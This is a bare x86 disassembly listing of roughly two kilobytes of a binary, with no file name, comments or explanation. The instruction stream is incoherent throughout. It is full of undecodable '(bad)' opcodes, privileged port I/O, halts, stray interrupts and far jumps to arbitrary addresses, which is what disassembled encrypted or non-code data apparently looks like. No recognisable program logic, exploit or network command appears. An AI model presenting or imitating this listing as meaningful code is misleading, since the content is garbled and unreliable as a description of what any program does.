  4069b7:	sbb    al,0x32
  4069b9:	push   ds
  4069ba:	(bad)  
  4069bb:	mov    ebx,0x8c3eedc2
  4069c0:	dec    ebp
  4069c1:	mov    sp,0x4938
  4069c5:	aad    0x47
  4069c7:	pop    edi
  4069c8:	xlat   BYTE PTR ds:[ebx]
  4069c9:	sub    eax,0x8f7775ef
  4069ce:	test   eax,0x39c76957
  4069d4:	xor    eax,DWORD PTR [eax-0x3ccf7c87]
  4069da:	jmp    0xfb2388f3
  4069df:	das    
  4069e0:	mov    ds:0xd93677d,eax
  4069e5:	xor    esi,DWORD PTR [esi]
  4069e7:	push   ds
  4069e8:	(bad)  
  4069e9:	rcr    ah,1
  4069eb:	fild   WORD PTR [ebp-0x6]
  4069ee:	dec    edx
  4069ef:	add    bh,BYTE PTR [edx]
  4069f1:	jbe    0x4069eb
  4069f3:	enter  0x385,0xad
  4069f7:	cld    
  4069f8:	mov    cl,0x3b
  4069fa:	dec    ecx
  4069fb:	push   ecx
  4069fc:	push   edi
  4069fd:	dec    ebx
  4069fe:	mov    edx,0x71608ada
  406a03:	cvttps2pi mm5,QWORD PTR [edx+ebp*1]
  406a07:	out    dx,eax
  406a08:	jle    0x406a2e
  406a0a:	mov    esi,DWORD PTR [esi-0x79262531]
  406a10:	dec    esi
  406a11:	inc    esp
  406a12:	fild   DWORD PTR [edx+0x6e764dd5]
  406a18:	stos   DWORD PTR es:[edi],eax
  406a19:	fidiv  DWORD PTR [ecx]
  406a1b:	push   esp
  406a1c:	idiv   BYTE PTR [esi+0x38]
  406a1f:	test   al,0x80
  406a21:	lock sar ebx,cl
  406a24:	inc    ecx
  406a25:	pop    es
  406a26:	pop    esp
  406a27:	pop    ds
  406a28:	pushf  
  406a29:	dec    esp
  406a2a:	stc    
  406a2b:	fbld   TBYTE PTR ds:0xf73b1819
  406a31:	dec    DWORD PTR [eax+0x33a855ed]
  406a37:	xchg   ebx,eax
  406a38:	test   BYTE PTR [ecx],dh
  406a3a:	sbb    al,0xad
  406a3c:	out    0x8c,eax
  406a3e:	mov    edx,ebp
  406a40:	push   ecx
  406a41:	and    edx,DWORD PTR [ebp+0x7b]
  406a44:	sub    eax,0xd7a59a58
  406a49:	push   cs
  406a4a:	xor    DWORD PTR [edi+edi*2+0x19beb289],ebx
  406a51:	and    ebx,DWORD PTR [ebx+0x22]
  406a54:	shl    bl,0x2b
  406a57:	cmp    cl,BYTE PTR [eax-0x1fd6c026]
  406a5d:	cli    
  406a5e:	test   al,0xfc
  406a60:	or     BYTE PTR [esp-0x6e],ch
  406a64:	nop
  406a65:	pop    eax
  406a66:	push   ecx
  406a67:	retf   
  406a68:	dec    esp
  406a69:	std    
  406a6a:	xor    al,0xce
  406a6c:	mov    eax,0x1b8b6094
  406a71:	jne    0x406a3d
  406a73:	nop
  406a74:	and    BYTE PTR [esi+ebx*4-0x32],dl
  406a78:	inc    ebx
  406a79:	pop    edx
  406a7a:	xor    BYTE PTR [ecx],bl
  406a7c:	jg     0x406aec
  406a7e:	dec    DWORD PTR [ecx-0x8353dae]
  406a84:	das    
  406a85:	ja     0x406a43
  406a87:	or     eax,0x5363dcb
  406a8c:	dec    ecx
  406a8d:	psrlq  mm3,mm5
  406a90:	out    dx,al
  406a91:	(bad)  
  406a92:	scas   eax,DWORD PTR es:[edi]
  406a93:	mov    ecx,0x5bae1a32
  406a98:	jge    0x406a22
  406a9a:	pop    esp
  406a9b:	(bad)  
  406a9c:	mov    eax,0x9354bf48
  406aa1:	(bad)  
  406aa2:	outs   dx,DWORD PTR ds:[esi]
  406aa3:	test   eax,0x767aa958
  406aa8:	outs   dx,DWORD PTR ds:[esi]
  406aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aaa:	rcr    al,1
  406aac:	sub    al,0x9
  406aae:	jns    0x406b00
  406ab0:	adc    al,0x59
  406ab2:	add    ah,BYTE PTR [ebx+0x59]
  406ab5:	sti    
  406ab6:	mov    esp,0x9343514c
  406abb:	addr16 pop ds
  406abd:	mov    eax,0x76fc7da6
  406ac2:	jmp    0x4e021fb7
  406ac7:	stos   BYTE PTR es:[edi],al
  406ac8:	or     esi,edx
  406aca:	ror    BYTE PTR [ecx-0x5b33b3d0],1
  406ad0:	jecxz  0x406a64
  406ad2:	ss pushf 
  406ad4:	jno    0x406aa7
  406ad6:	test   eax,0xf0e93302
  406adb:	cmp    dh,dh
  406add:	pop    ebx
  406ade:	imul   esi,DWORD PTR [eax-0x40799e2e],0x63a7ea91
  406ae8:	pop    ss
  406ae9:	ficom  WORD PTR [ebx+0x4c]
  406aec:	jnp    0x406ab0
  406aee:	pushf  
  406aef:	inc    esp
  406af0:	(bad)  
  406af1:	xchg   edi,eax
  406af2:	jmp    0x6cab:0x8ff4a174
  406af9:	push   cx
  406afb:	dec    DWORD PTR [ecx]
  406afd:	or     al,0x4f
  406aff:	js     0x406b71
  406b01:	xor    BYTE PTR [esi-0x6059d23f],0xed
  406b08:	sub    dh,BYTE PTR [eax+0x7c]
  406b0b:	hlt    
  406b0c:	aam    0x39
  406b0e:	cwde   
  406b0f:	enter  0x809a,0x4e
  406b13:	out    0x40,eax
  406b15:	imul   ebx,DWORD PTR [eax-0x4ecebeba],0x8
  406b1c:	sbb    ah,al
  406b1e:	jle    0x406aa9
  406b20:	fwait
  406b21:	arpl   WORD PTR [esi-0x41],bp
  406b24:	imul   esi,ecx,0x83109ac0
  406b2a:	sahf   
  406b2b:	jp     0x406ad7
  406b2d:	jb     0x406b87
  406b2f:	pop    esp
  406b30:	inc    ecx
  406b31:	retf   0x1e48
  406b34:	cmp    cl,BYTE PTR [ebx+eax*2-0x2]
  406b38:	pop    ebx
  406b39:	xchg   esp,eax
  406b3a:	inc    ecx
  406b3b:	mov    ebx,0x51e316b3
  406b40:	mov    ebp,0x6c44932a
  406b45:	jp     0x406ae2
  406b47:	aas    
  406b48:	xchg   edx,eax
  406b49:	pop    edi
  406b4a:	int    0xc6
  406b4c:	adc    eax,0xf8687484
  406b51:	lods   eax,DWORD PTR ds:[esi]
  406b52:	push   ds
  406b53:	enter  0x926,0x6f
  406b57:	inc    esi
  406b58:	outs   dx,BYTE PTR ds:[esi]
  406b59:	xchg   esi,eax
  406b5a:	jae    0x406b51
  406b5c:	dec    DWORD PTR [ecx-0x17]
  406b5f:	and    al,0xb8
  406b61:	sub    DWORD PTR [esi],esi
  406b63:	inc    eax
  406b64:	sti    
  406b65:	sbb    dl,BYTE PTR [edx+ebp*4+0x4b]
  406b69:	test   BYTE PTR [ebx+0x7f],dh
  406b6c:	scas   al,BYTE PTR es:[edi]
  406b6d:	inc    eax
  406b6e:	inc    ebx
  406b6f:	jg     0x406b3c
  406b71:	out    dx,al
  406b72:	and    eax,0x61a68aba
  406b77:	sub    al,0xce
  406b79:	stc    
  406b7a:	test   eax,0x8024a505
  406b7f:	ja     0x406b26
  406b81:	fist   WORD PTR [esi+ebp*1+0x0]
  406b85:	cmp    ecx,edx
  406b87:	adc    DWORD PTR [eax],edx
  406b89:	xlat   BYTE PTR ds:[ebx]
  406b8a:	pop    ebx
  406b8b:	inc    ebx
  406b8c:	gs aas 
  406b8e:	ret    0xcba4
  406b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b92:	pushf  
  406b93:	jae    0x406b20
  406b95:	imul   esp,DWORD PTR [ecx+0x46],0xc7920500
  406b9c:	mov    edx,0x5a33474d
  406ba1:	aaa    
  406ba2:	xor    eax,0x96be1de7
  406ba7:	sbb    eax,0x56296d80
  406bac:	or     bl,al
  406bae:	xchg   ebp,eax
  406baf:	pusha  
  406bb0:	dec    ebp
  406bb1:	out    dx,eax
  406bb2:	outs   dx,DWORD PTR ds:[esi]
  406bb3:	icebp  
  406bb4:	outs   dx,BYTE PTR ds:[esi]
  406bb5:	pop    ecx
  406bb6:	call   eax
  406bb8:	icebp  
  406bb9:	inc    edx
  406bba:	sahf   
  406bbb:	xchg   ebp,eax
  406bbc:	or     DWORD PTR [edx+0x14e4d5d9],0x58
  406bc3:	sub    al,0x1b
  406bc5:	mov    bh,0xb5
  406bc7:	inc    edx
  406bc8:	(bad)  
  406bc9:	mov    cs,WORD PTR [edi-0x41dbf6df]
  406bcf:	imul   ebx,DWORD PTR [ebx+0x70],0x79
  406bd3:	dec    ebx
  406bd4:	lds    ebp,FWORD PTR [eax-0x7c]
  406bd7:	xchg   DWORD PTR [ecx-0x1e08f321],eax
  406bdd:	sbb    al,0xab
  406bdf:	dec    esi
  406be0:	dec    eax
  406be1:	adc    eax,0x4617c3a
  406be6:	mov    cl,0x7
  406be8:	clc    
  406be9:	inc    ebp
  406bea:	outs   dx,DWORD PTR ds:[esi]
  406beb:	cwde   
  406bec:	retf   0x8555
  406bef:	lods   al,BYTE PTR ds:[esi]
  406bf0:	cmc    
  406bf1:	call   0xacd624bf
  406bf6:	mov    BYTE PTR [ebx+eax*2],cl
  406bf9:	test   cl,cl
  406bfb:	dec    ecx
  406bfc:	cld    
  406bfd:	mov    al,ds:0xc33ead0e
  406c02:	xchg   ecx,eax
  406c03:	addr16 jmp 0xc33bce65
  406c09:	aad    0x9
  406c0b:	ret    0x5d5f
  406c0e:	mov    ds:0x43fecd3d,eax
  406c13:	retf   
  406c14:	(bad)  
  406c15:	in     al,0x66
  406c17:	inc    ebx
  406c18:	das    
  406c19:	stc    
  406c1a:	push   ss
  406c1b:	mov    DWORD PTR [edi+0x46a5b82b],ebp
  406c21:	leave  
  406c22:	mov    DWORD PTR [eax-0x617b38b1],0x6500a53
  406c2c:	sbb    BYTE PTR [eax+0x49627e6c],0xfd
  406c33:	mov    eax,DWORD PTR ss:0x6407d455
  406c3a:	push   esp
  406c3b:	pop    ds
  406c3c:	jnp    0x406c0a
  406c3e:	jmp    0x406c0e
  406c40:	ret    
  406c41:	push   ebx
  406c42:	and    BYTE PTR [ecx-0x5039aec5],bh
  406c48:	lods   eax,DWORD PTR ds:[esi]
  406c49:	and    eax,0x87df153b
  406c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c4f:	jmp    0x406c34
  406c51:	nop
  406c52:	mov    al,0x4b
  406c54:	cmp    eax,0xb0b0699
  406c59:	mov    bh,0x53
  406c5b:	xchg   ebx,eax
  406c5c:	ror    BYTE PTR ds:0xfe561e99,0x1e
  406c63:	xor    ebx,DWORD PTR ds:[ecx]
  406c66:	ror    BYTE PTR [edi+0xe],0x32
  406c6a:	vzeroupper 
  406c6d:	mov    dh,0x2d
  406c6f:	sub    ebx,DWORD PTR [edx]
  406c71:	xor    DWORD PTR ds:0x9ae39376,esp
  406c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c78:	scas   al,BYTE PTR es:[edi]
  406c79:	mov    ds:0xd339a12f,al
  406c7e:	lds    edi,FWORD PTR [edi+0x13]
  406c81:	(bad)  
  406c82:	sbb    al,0x7
  406c84:	stos   DWORD PTR es:[edi],eax
  406c85:	jns    0x406c11
  406c87:	mov    eax,ds:0xc4b5e997
  406c8c:	popa   
  406c8d:	rcr    dl,0x91
  406c90:	cs psubsb mm6,mm7
  406c94:	push   ss
  406c95:	ins    BYTE PTR es:[edi],dx
  406c96:	jecxz  0x406cd3
  406c98:	jae    0x406c80
  406c9a:	iret   
  406c9b:	int    0x57
  406c9d:	sar    ebx,1
  406c9f:	cmp    edi,DWORD PTR [eax]
  406ca1:	pop    ebp
  406ca2:	mov    esi,0x1eae9fba
  406ca7:	jb     0x406cf2
  406ca9:	dec    esi
  406caa:	push   es
  406cab:	jle    0x406d15
  406cad:	mov    bl,0x2
  406caf:	test   al,0x41
  406cb1:	ins    BYTE PTR es:[edi],dx
  406cb2:	jecxz  0x406cfb
  406cb4:	pop    ebp
  406cb5:	mov    ecx,0xeb994ff0
  406cba:	mov    ch,0x97
  406cbc:	mov    ebx,0x6b195f15
  406cc1:	mov    DWORD PTR [edx+0x32487e40],0xbfa644e9
  406ccb:	or     bh,BYTE PTR [edx-0x688f3447]
  406cd1:	leave  
  406cd2:	dec    ebx
  406cd3:	rol    DWORD PTR [ebx-0x65],0x6b
  406cd7:	hlt    
  406cd8:	aaa    
  406cd9:	ret    0x9ae2
  406cdc:	iret   
  406cdd:	push   edx
  406cde:	data16 hlt 
  406ce0:	sub    BYTE PTR [eax+eax*8+0x132e5ead],bh
  406ce7:	add    eax,DWORD PTR [ebx-0x2d]
  406cea:	push   ebx
  406ceb:	repnz mov ah,0x45
  406cee:	popa   
  406cef:	mov    ss:0x3b113a75,eax
  406cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf6:	(bad)  
  406cf7:	sbb    esi,esi
  406cf9:	mov    ds:0xb37f5f13,eax
  406cfe:	sbb    BYTE PTR [ecx+0x7f],dh
  406d01:	fisubr WORD PTR [ecx+0x53]
  406d04:	pop    edi
  406d05:	sbb    BYTE PTR [edi-0x244cef82],bl
  406d0b:	mov    eax,ds:0x3aea02f2
  406d10:	call   DWORD PTR [eax]
  406d12:	out    dx,al
  406d13:	(bad)  
  406d14:	out    dx,eax
  406d15:	les    esp,FWORD PTR [edx]
  406d17:	nop
  406d18:	daa    
  406d19:	add    al,0xed
  406d1b:	mov    ch,0xf1
  406d1d:	retf   
  406d1e:	xchg   ecx,esp
  406d20:	dec    ebp
  406d21:	icebp  
  406d22:	xlat   BYTE PTR ds:[ebx]
  406d23:	mov    eax,0x4e257e38
  406d28:	pop    es
  406d29:	mov    edi,ebx
  406d2b:	sbb    BYTE PTR [di],al
  406d2e:	jmp    0x4d28c3b4
  406d33:	daa    
  406d34:	call   0xc8fe663c
  406d39:	dec    edi
  406d3a:	out    dx,al
  406d3b:	call   0xcb986412
  406d40:	test   al,0xc2
  406d42:	cmc    
  406d43:	popf   
  406d44:	dec    esp
  406d45:	add    DWORD PTR [edx+0x63],ebp
  406d48:	xchg   esi,eax
  406d49:	icebp  
  406d4a:	dec    ecx
  406d4b:	adc    eax,0xa3be8403
  406d50:	push   esp
  406d51:	nop
  406d52:	das    
  406d53:	ja     0x406d6c
  406d55:	shl    BYTE PTR [edx-0x122d757a],1
  406d5b:	mov    ecx,0x80f33c0d
  406d60:	dec    ebx
  406d61:	popf   
  406d62:	cdq    
  406d63:	push   ds
  406d64:	inc    ebx
  406d65:	je     0x406d3e
  406d67:	ret    0xb146
  406d6a:	stc    
  406d6b:	in     al,0xcc
  406d6d:	repnz repnz lea esi,[ebx+0x48a484e8]
  406d75:	in     eax,0x5
  406d77:	push   edx
  406d78:	xchg   BYTE PTR [edx-0x15],dl
  406d7b:	adc    bl,BYTE PTR [ebp-0x30]
  406d7e:	adc    al,0x44
  406d80:	in     al,dx
  406d81:	clc    
  406d82:	push   ss
  406d83:	pop    edx
  406d84:	xchg   ebx,eax
  406d85:	and    ch,ch
  406d87:	daa    
  406d88:	pop    es
  406d89:	lea    ebx,[edx+0x1cbe394f]
  406d8f:	fistp  DWORD PTR [eax+0x1c]
  406d92:	dec    ebp
  406d93:	cs jne 0x406d8f
  406d96:	sbb    BYTE PTR [edi+ecx*4],al
  406d99:	inc    edx
  406d9a:	adc    eax,0xa4923101
  406d9f:	lahf   
  406da0:	push   esi
  406da1:	inc    esi
  406da2:	dec    esi
  406da3:	call   0xa902:0x239c2ce3
  406daa:	lahf   
  406dab:	(bad)  
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	aas    
  406dae:	inc    edx
  406daf:	hlt    
  406db0:	mov    edi,0xaf82d4e1
  406db5:	repz ss lahf 
  406db8:	arpl   WORD PTR [edx],cx
  406dba:	cs inc ebx
  406dbc:	sub    al,0x4b
  406dbe:	dec    esp
  406dbf:	repnz mov esi,0xd85cb04b
  406dc5:	and    al,BYTE PTR [edi+0x40897974]
  406dcb:	jno    0x406de9
  406dcd:	fdiv   DWORD PTR [edi]
  406dcf:	jmp    0xce3bb735
  406dd4:	or     DWORD PTR [edi-0x50bf7f6a],edx
  406dda:	mov    dh,0x7c
  406ddc:	in     al,0xfd
  406dde:	mov    ah,0x2d
  406de0:	mov    al,0x15
  406de2:	scas   eax,DWORD PTR es:[edi]
  406de3:	cwde   
  406de4:	mov    edx,0xcff34c69
  406de9:	(bad)  [ebx+0x5189f70a]
  406def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406df0:	or     bl,BYTE PTR [esi-0x44]
  406df3:	mov    al,BYTE PTR [esi+0x73]
  406df6:	icebp  
  406df7:	shr    DWORD PTR [edi-0x5c34c370],0x70
  406dfe:	sbb    al,0x83
  406e00:	(bad)  
  406e01:	jmp    0x406d9e
  406e03:	and    BYTE PTR ds:0xf4134fd7,ch
  406e09:	lahf   
  406e0a:	add    al,0xd3
  406e0c:	add    al,0xee
  406e0e:	scas   eax,DWORD PTR es:[edi]
  406e0f:	mov    al,0xe
  406e11:	sahf   
  406e12:	out    dx,al
  406e13:	xabort 0x16
  406e16:	mov    eax,0xc585a740
  406e1b:	ret    
  406e1c:	mov    ebp,0xacec65f2
  406e21:	fwait
  406e22:	sbb    BYTE PTR [edi-0x11],cl
  406e25:	jg     0x406e27
  406e27:	mov    esp,0x15a6734c
  406e2c:	sub    DWORD PTR [eax-0x29],ebx
  406e2f:	xchg   ebx,eax
  406e30:	jmp    0x52ac:0x6e50bd3d
  406e37:	sub    al,0x99
  406e39:	sub    al,0xbb
  406e3b:	je     0x406ea6
  406e3d:	mov    ch,ch
  406e3f:	jl     0x406e8c
  406e41:	shl    DWORD PTR [esi],0x65
  406e44:	jo     0x406e1f
  406e46:	mov    ebx,0xe8d1dd5
  406e4b:	sub    eax,0xb6d11072
  406e50:	xchg   ebp,eax
  406e51:	test   BYTE PTR [ebp-0x6c],dh
  406e54:	jns    0x406e5d
  406e56:	(bad)  
  406e57:	aam    0xdf
  406e59:	call   0xcc0b8c61
  406e5e:	jp     0x406e6b
  406e60:	arpl   sp,sp
  406e62:	test   eax,0xc242cf94
  406e67:	mov    ds:0x3d127299,eax
  406e6c:	popa   
  406e6d:	push   0x4b5e6ee0
  406e72:	pop    ebx
  406e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e74:	xchg   edx,eax
  406e75:	scas   eax,DWORD PTR es:[edi]
  406e76:	retf   0x434
  406e79:	stos   BYTE PTR es:[edi],al
  406e7a:	ret    
  406e7b:	mov    eax,0xdf9542ef
  406e80:	inc    esi
  406e81:	lock sub DWORD PTR [edx-0x19],esp
  406e85:	nop
  406e86:	les    ebx,FWORD PTR [edx+ecx*2]
  406e89:	stos   DWORD PTR es:[edi],eax
  406e8a:	mov    ebx,0xf09890a3
  406e8f:	push   0xed8588a9
  406e94:	and    edi,DWORD PTR [eax]
  406e96:	js     0x406e71
  406e98:	mov    bh,0x6b
  406e9a:	and    eax,0x19a83e32
  406e9f:	arpl   WORD PTR [ebp+eax*4+0x7fb0e1b6],si
  406ea6:	dec    ebp
  406ea7:	std    
  406ea8:	add    DWORD PTR [ebp+0x54fb0e22],edi
  406eae:	or     BYTE PTR [edi-0x2e70317e],bh
  406eb4:	mov    esp,0x3285c4bf
  406eb9:	jae    0x406e6e
  406ebb:	outs   dx,BYTE PTR ds:[esi]
  406ebc:	inc    ebx
  406ebd:	push   ds
  406ebe:	push   esp
  406ebf:	mov    BYTE PTR [edi-0x461a7d3e],dl
  406ec5:	cmp    ebp,esi
  406ec7:	repz test al,0x67
  406eca:	fnstenv [eax-0x4ab53a49]
  406ed0:	jmp    DWORD PTR [edx+0x37f14d5f]
  406ed6:	mov    ecx,0xecee14e9
  406edb:	rol    ah,1
  406edd:	sbb    al,0x5
  406edf:	in     al,0x6e
  406ee1:	jo     0x406ee5
  406ee3:	ss jae 0x406e8b
  406ee6:	inc    ebp
  406ee7:	outs   dx,DWORD PTR ds:[esi]
  406ee8:	enter  0x3c44,0xe0
  406eec:	inc    si
  406eee:	idiv   BYTE PTR [edx+0x2846af47]
  406ef4:	mov    esp,0xd9220a44
  406ef9:	and    eax,0xc646bcf9
  406efe:	add    cl,BYTE PTR [esp+0x3c9f45f]
  406f05:	push   ecx
  406f06:	dec    edx
  406f07:	pop    esi
  406f08:	mov    edx,0xd9b09959
  406f0d:	dec    ecx
  406f0e:	pop    edi
  406f0f:	sbb    esp,DWORD PTR [ebx]
  406f11:	mov    ecx,0x91dc80fd
  406f16:	sub    eax,0x610149cb
  406f1b:	lahf   
  406f1c:	pop    edx
  406f1d:	cli    
  406f1e:	lds    edi,FWORD PTR [edi+edx*8+0x303a847b]
  406f25:	out    0x1,eax
  406f27:	sti    
  406f28:	cld    
  406f29:	add    dh,bh
  406f2b:	pop    ebx
  406f2c:	(bad)  
  406f2e:	inc    ebx
  406f2f:	inc    edx
  406f30:	repnz adc al,0xca
  406f33:	push   0xee053c03
  406f38:	fld    QWORD PTR [eax+0x46cb29a7]
  406f3e:	fdiv   st(0),st
  406f40:	cli    
  406f41:	jns    0x406f65
  406f43:	cmc    
  406f44:	sbb    eax,0x9a37da11
  406f49:	add    dh,dl
  406f4b:	cmp    BYTE PTR [esi],bl
  406f4d:	je     0x406f01
  406f4f:	lock sub cl,dh
  406f52:	inc    edi
  406f53:	fiadd  DWORD PTR ds:0xb4985acc
  406f59:	rol    BYTE PTR [esi+0x7b99a731],cl
  406f5f:	cwde   
  406f60:	inc    ebx
  406f61:	pop    es
  406f62:	pop    eax
  406f63:	mov    al,ds:0x655c83ae
  406f68:	mov    ah,0xa3
  406f6a:	fcom   DWORD PTR [ebp-0x44b36672]
  406f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f71:	dec    esp
  406f72:	sub    ecx,eax
  406f74:	push   es
  406f75:	int    0xeb
  406f77:	jl     0x406f36
  406f79:	xchg   esi,eax
  406f7a:	test   BYTE PTR [ebx+ebx*2+0x2351e6c2],0x7e
  406f82:	les    ecx,FWORD PTR [ebx+ebx*4+0x58]
  406f86:	stc    
  406f87:	mov    cl,0xc
  406f89:	push   esp
  406f8a:	inc    ebp
  406f8b:	in     eax,dx
  406f8c:	fs mov ebp,0x13a817cb
  406f92:	jno    0x407001
  406f94:	cs push ecx
  406f96:	push   ebp
  406f97:	mov    esp,esp
  406f99:	pop    ebx
  406f9a:	shl    BYTE PTR ds:0x9160cb58,0xaa
  406fa1:	sub    al,0x4c
  406fa3:	xchg   esi,eax
  406fa4:	xor    DWORD PTR ds:0x10172adb,0x8bb4fc9a
  406fae:	jb     0x406fe3
  406fb0:	sbb    ah,BYTE PTR [ebp+0x3]
  406fb3:	bound  esi,QWORD PTR [edi+0xe]
  406fb6:	push   edx
  406fb7:	sbb    bh,BYTE PTR [ebp+0x57]
  406fba:	cmp    ecx,eax
  406fbc:	sbb    eax,0xe2f58d3e
  406fc1:	add    al,0x80
  406fc3:	xchg   edi,eax
  406fc4:	imul   eax,DWORD PTR [eax],0xffffff8f
  406fc7:	fbstp  TBYTE PTR [esi-0x7c19b600]
  406fcd:	test   eax,ecx
  406fcf:	or     ah,BYTE PTR [edx]
  406fd1:	push   ebp
  406fd2:	pop    es
  406fd3:	(bad)  
  406fd4:	into   
  406fd5:	add    al,0x8e
  406fd7:	push   ss
  406fd8:	sbb    ebx,DWORD PTR [esi+ecx*4]
  406fdb:	push   edx
  406fdc:	das    
  406fdd:	cmp    eax,0xf9e48b38
  406fe2:	scas   al,BYTE PTR es:[edi]
  406fe3:	or     cl,ch
  406fe5:	sbb    BYTE PTR [edi],ch
  406fe7:	lods   al,BYTE PTR ds:[esi]
  406fe8:	mov    dl,0x4b
  406fea:	test   eax,0x3a188b22
  406fef:	xlat   BYTE PTR ds:[ebx]
  406ff0:	ins    DWORD PTR es:[edi],dx
  406ff1:	xor    eax,0xb91e7e5e
  406ff6:	out    dx,eax
  406ff7:	ror    dl,0x1d
  406ffa:	jge    0x406f9b
  406ffc:	sub    al,0x1
  406ffe:	mov    ss,WORD PTR [edi]
  407000:	outs   dx,BYTE PTR ds:[esi]
  407001:	xor    eax,0x6f242664
  407006:	and    eax,0xe58fc78f
  40700b:	mov    ebp,0x49d059ea
  407010:	loop   0x406ff1
  407012:	dec    ebx
  407013:	pop    ss
  407014:	xchg   esi,eax
  407015:	lea    ebp,[ebp-0x17]
  407018:	mov    esi,0x37176d00
  40701d:	fimul  DWORD PTR [ecx+0x4d7d5db9]
  407023:	mov    esi,0x1d5c6e8e
  407028:	cmp    esi,DWORD PTR [ecx-0x75384bde]
  40702e:	sbb    eax,0xf58a2409
  407033:	jnp    0x407021
  407035:	or     eax,0x7a3059b3
  40703a:	add    bh,dl
  40703c:	mov    ds:0x7f1c68ae,eax
  407041:	dec    ebx
  407042:	add    DWORD PTR [ebx],esi
  407044:	mov    eax,ds:0x454fbb3b
  407049:	push   0x684f6518
  40704e:	dec    edx
  40704f:	adc    BYTE PTR [eax-0x62],ch
  407052:	std    
  407053:	test   BYTE PTR [edi-0x4086f9fd],bl
  407059:	(bad)  
  40705a:	adc    DWORD PTR ds:0x421aa2e5,ebx
  407060:	cmp    al,0x38
  407062:	retf   0xd31b
  407065:	lea    edx,[ecx]
  407067:	xchg   ecx,eax
  407068:	inc    ecx
  407069:	fadd   QWORD PTR [edx+0xf2f76e9]
  40706f:	add    BYTE PTR [edx-0x11a65381],bh
  407075:	iret   
  407076:	mov    BYTE PTR [edi-0x54777126],dl
  40707c:	mov    esi,0x3b87971e
  407081:	das    
  407082:	adc    al,0x87
  407084:	xchg   ebp,eax
  407085:	xor    DWORD PTR [eax],esi
  407087:	jg     0x4070bd
  407089:	popa   
  40708a:	mov    eax,ds:0xdd05131c
  40708f:	jmp    0x9a45:0x3a0e02d3
  407096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407097:	or     al,0x42
  407099:	dec    ebp
  40709a:	inc    edi
  40709b:	mov    cl,0xcf
  40709d:	sub    ecx,ecx
  40709f:	iret   
  4070a0:	mov    cl,0x29
  4070a2:	shl    bh,0x49
  4070a5:	out    dx,eax
  4070a6:	jl     0x407096
  4070a8:	xchg   DWORD PTR [eax-0x1ae1cc93],edx
  4070ae:	dec    esi
  4070af:	in     eax,dx
  4070b0:	push   ebx
  4070b1:	jno    0x407076
  4070b3:	dec    esp
  4070b4:	mov    ebp,0xacb5f2e9
  4070b9:	push   ebx
  4070ba:	hlt    
  4070bb:	jo     0x407096
  4070bd:	lea    esi,[edx]
  4070bf:	aas    
  4070c0:	mov    bl,0xb4
  4070c2:	pop    ebp
  4070c3:	mov    al,0x21
  4070c5:	ror    eax,1
  4070c7:	add    edx,DWORD PTR [edx-0x49230e2a]
  4070cd:	fsubrp st(1),st
  4070cf:	add    al,0xb9
  4070d1:	mov    al,0x49
  4070d3:	arpl   WORD PTR [ecx],cx
  4070d5:	outs   dx,DWORD PTR ds:[esi]
  4070d6:	adc    eax,0x691da824
  4070db:	inc    esp
  4070dc:	pop    esp
  4070dd:	mul    dh
  4070df:	jae    0x40709d
  4070e1:	cli    
  4070e2:	sub    eax,0x23b5eace
  4070e7:	lods   eax,DWORD PTR ds:[esi]
  4070e8:	mov    ebp,gs
  4070ea:	test   al,0x94
  4070ec:	fild   DWORD PTR fs:[eax-0x1adfa4ca]
  4070f3:	fs (bad) 
  4070f6:	stos   BYTE PTR es:[edi],al
  4070f7:	cdq    
  4070f8:	mov    BYTE PTR cs:[ebx+ecx*4],al
  4070fc:	mov    edi,0xb27c5619
  407101:	cmp    BYTE PTR [ebp-0x3febfb03],bl
  407107:	out    dx,al
  407108:	dec    ebx
  40710a:	mov    bh,0x7
  40710c:	out    0xa,eax
  40710e:	cmp    BYTE PTR [esi],ch
  407110:	push   eax
  407111:	jns    0x407100
  407113:	fisub  WORD PTR [edi+0x5128f0c1]
  407119:	pop    ss
  40711a:	xchg   edx,eax
  40711b:	mov    eax,ds:0x777f4a3f
  407120:	ret    0xd3ef
  407123:	and    BYTE PTR [ecx+0x56727e06],al
  407129:	out    0x42,eax
  40712b:	push   ecx
  40712c:	sub    eax,0x90961553
  407131:	or     eax,0x15226bd
  407136:	xchg   ebp,eax
  407137:	dec    ecx
  407138:	aam    0x5e
  40713a:	je     0x407187
  40713c:	jae    0x4070ec
  40713e:	(bad)  
  40713f:	or     edx,DWORD PTR [ebx-0x1e]
  407142:	call   DWORD PTR [esi*4-0x62b06762]
  407149:	sub    BYTE PTR [esi-0x5b],ah
  40714c:	stos   DWORD PTR es:[edi],eax
  40714d:	arpl   WORD PTR [edx],sp
  40714f:	cmp    BYTE PTR [eax-0x1e2c1236],cl
  407155:	fucom  st(7)
  407157:	(bad)  
  407158:	in     eax,0x8
  40715a:	sub    bh,ch
  40715c:	or     al,0x68
  40715e:	lahf   
  40715f:	pop    ss
  407160:	or     DWORD PTR [ebx-0x6],ecx
  407163:	dec    edx
  407164:	fisttp DWORD PTR ds:[eax+0x6d]
  407168:	adc    eax,0xf4127d5d
  40716d:	fdiv   DWORD PTR [eax+0xc759d3b]
  407173:	aad    0xd9
  407175:	pop    eax
  407176:	adc    eax,0x29200437
  40717b:	jge    0x40713a
  40717d:	sub    eax,0x39f6c6b7
  407182:	inc    esi
  407183:	mov    eax,ds:0x226bab74
  407188:	(bad)  
  40718a:	fwait
  40718b:	in     al,0x5e
  40718d:	sahf   
  40718e:	xchg   esp,eax
  40718f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407190:	imul   ecx,DWORD PTR [edi-0x5b7df33d],0x4de88f2c
  40719a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40719b:	shl    DWORD PTR ds:0x9b555691,1
  4071a1:	jp     0x407142
  4071a3:	movlps QWORD PTR [edi],xmm2
  4071a6:	fild   DWORD PTR [edx]
  4071a8:	ret    0xdd
  4071ab:	inc    ebx
  4071ac:	es ins BYTE PTR es:[edi],dx
  4071ae:	out    dx,eax
